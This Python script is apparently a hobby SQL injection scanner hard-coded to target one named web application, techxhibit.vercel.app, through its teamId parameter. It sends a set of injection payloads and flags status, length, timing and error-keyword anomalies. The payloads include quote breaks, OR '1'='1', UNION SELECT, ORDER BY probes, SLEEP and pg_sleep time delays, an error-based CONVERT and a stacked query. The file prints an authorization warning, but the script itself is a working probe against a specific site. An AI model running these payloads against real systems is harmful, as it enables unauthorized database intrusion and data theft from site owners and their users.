"""
SQL Injection Testing Tool
Educational purposes only - use only on authorized systems
"""

import requests
import time
from urllib.parse import urlencode
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "https://techxhibit.vercel.app/"
BASELINE_PARAM = {"teamId": "S19"}

# Test payloads
PAYLOADS = {
    "Single Quote": "S19'",
    "Double Quote": 'S19"',
    "SQL Comment (--)": "S19--",
    "SQL Comment (#)": "S19#",
    "Boolean True": "S19' OR '1'='1",
    "Boolean False": "S19' AND '1'='2",
    "Union Base": "S19' UNION SELECT NULL--",
    "Order By 1": "S19' ORDER BY 1--",
    "Order By 10": "S19' ORDER BY 10--",
    "Time Delay MySQL": "S19' AND SLEEP(5)--",
    "Time Delay PostgreSQL": "S19' AND pg_sleep(5)--",
    "Error Based": "S19' AND 1=CONVERT(int, (SELECT @@version))--",
    "Stacked Query": "S19'; SELECT SLEEP(5)--",
}

def get_baseline():
    """Get baseline response for comparison"""
    try:
        response = requests.get(BASE_URL, params=BASELINE_PARAM, timeout=10)
        return {
            "status": response.status_code,
            "length": len(response.text),
            "time": response.elapsed.total_seconds(),
            "text": response.text
        }
    except Exception as e:
        print(f"{Fore.RED}Error getting baseline: {e}")
        return None

def test_payload(payload_name, payload_value):
    """Test a single payload"""
    params = {"teamId": payload_value}
    
    try:
        start_time = time.time()
        response = requests.get(BASE_URL, params=params, timeout=15)
        elapsed = time.time() - start_time
        
        return {
            "name": payload_name,
            "status": response.status_code,
            "length": len(response.text),
            "time": elapsed,
            "text": response.text,
            "url": response.url
        }
    except requests.exceptions.Timeout:
        return {
            "name": payload_name,
            "status": "TIMEOUT",
            "length": 0,
            "time": 15,
            "text": "",
            "url": f"{BASE_URL}?{urlencode(params)}"
        }
    except Exception as e:
        return {
            "name": payload_name,
            "status": f"ERROR: {e}",
            "length": 0,
            "time": 0,
            "text": "",
            "url": f"{BASE_URL}?{urlencode(params)}"
        }

def analyze_results(baseline, results):
    """Analyze and display results"""
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}SQL INJECTION TEST RESULTS")
    print(f"{Fore.CYAN}{'='*80}\n")
    
    print(f"{Fore.GREEN}Baseline Response:")
    print(f"  Status: {baseline['status']}")
    print(f"  Length: {baseline['length']} bytes")
    print(f"  Time: {baseline['time']:.3f}s\n")
    
    findings = []
    
    for result in results:
        payload_name = result['name']
        status = result['status']
        length = result['length']
        response_time = result['time']
        
        # Detect anomalies
        anomalies = []
        
        # Status code change
        if status != baseline['status']:
            anomalies.append(f"Status changed: {baseline['status']} → {status}")
        
        # Significant length difference
        length_diff = abs(length - baseline['length'])
        if length_diff > 100:
            anomalies.append(f"Length diff: {length_diff:+d} bytes")
        
        # Time-based detection
        if response_time > baseline['time'] + 4:
            anomalies.append(f"Time delay: +{response_time - baseline['time']:.2f}s")
        
        # Timeout
        if status == "TIMEOUT":
            anomalies.append("REQUEST TIMEOUT (possible time-based SQLi)")
        
        # Error indicators in response
        error_keywords = ['error', 'sql', 'syntax', 'mysql', 'postgresql', 'oracle', 
                         'sqlite', 'exception', 'warning', 'invalid', 'unexpected']
        text_lower = result['text'].lower()
        found_errors = [kw for kw in error_keywords if kw in text_lower]
        if found_errors:
            anomalies.append(f"Error keywords found: {', '.join(found_errors)}")
        
        # Display result
        if anomalies:
            print(f"{Fore.RED}[!] {payload_name}")
            findings.append((payload_name, anomalies))
        else:
            print(f"{Fore.GREEN}[✓] {payload_name}")
        
        print(f"    Status: {status} | Length: {length} | Time: {response_time:.3f}s")
        
        if anomalies:
            for anomaly in anomalies:
                print(f"    {Fore.YELLOW}⚠ {anomaly}")
        
        print(f"    URL: {result['url']}\n")
    
    # Summary
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}SUMMARY")
    print(f"{Fore.CYAN}{'='*80}\n")
    
    if findings:
        print(f"{Fore.RED}[!] {len(findings)} potential vulnerabilities detected:\n")
        for payload_name, anomalies in findings:
            print(f"{Fore.YELLOW}  • {payload_name}")
            for anomaly in anomalies:
                print(f"    - {anomaly}")
            print()
    else:
        print(f"{Fore.GREEN}[✓] No obvious SQL injection vulnerabilities detected")
        print(f"{Fore.YELLOW}Note: This doesn't guarantee the application is secure.")
        print(f"{Fore.YELLOW}Consider using advanced tools like SQLMap for deeper testing.\n")

def main():
    print(f"{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}SQL INJECTION TESTING TOOL")
    print(f"{Fore.CYAN}{'='*80}\n")
    print(f"{Fore.YELLOW}⚠ WARNING: Only use on systems you are authorized to test!")
    print(f"{Fore.YELLOW}⚠ Unauthorized testing is illegal.\n")
    
    print(f"Target: {BASE_URL}")
    print(f"Parameter: teamId")
    print(f"Baseline value: S19\n")
    
    input(f"{Fore.CYAN}Press Enter to start testing...")
    
    # Get baseline
    print(f"\n{Fore.CYAN}[*] Getting baseline response...")
    baseline = get_baseline()
    
    if not baseline:
        print(f"{Fore.RED}Failed to get baseline. Exiting.")
        return
    
    print(f"{Fore.GREEN}[✓] Baseline established\n")
    
    # Test payloads
    print(f"{Fore.CYAN}[*] Testing {len(PAYLOADS)} payloads...\n")
    results = []
    
    for i, (name, payload) in enumerate(PAYLOADS.items(), 1):
        print(f"{Fore.CYAN}[{i}/{len(PAYLOADS)}] Testing: {name}...")
        result = test_payload(name, payload)
        results.append(result)
        time.sleep(0.5)  # Be respectful, don't hammer the server
    
    # Analyze results
    analyze_results(baseline, results)
    
    print(f"\n{Fore.CYAN}Testing complete!")

if __name__ == "__main__":
    main()
